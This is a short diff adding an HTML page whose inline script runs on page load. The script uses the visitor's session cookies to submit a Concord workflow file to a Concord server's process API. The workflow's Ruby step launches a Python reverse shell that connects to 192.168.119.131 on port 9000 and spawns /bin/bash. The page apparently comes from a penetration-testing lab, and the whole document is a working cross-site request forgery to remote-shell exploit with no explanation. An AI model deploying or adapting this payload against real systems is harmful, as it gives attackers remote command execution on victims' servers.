@@ -1,0 +1,30 @@
+<html>
+<head>
+   <script>
+      const host = '192.168.119.131';
+      const port = 9000;
+      yml = `
+configuration:
+  dependencies:
+  - "mvn://org.jruby:jruby:9.1.13.0"
+
+flows:
+  default:
+  - script: ruby
+    body: |
+      system('python', '-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")')
+
+`
+      var ymlBlob = new Blob([yml], { type: "application/yml" });
+      var fd = new FormData();
+      fd.append('concord.yml', ymlBlob);
+      fetch("http://concord:8001/api/v1/process", {
+            credentials: 'include',
+            method: 'POST',
+            body: fd
+         })
+   </script>
+</head>
+<body>
+</body>
+</html>
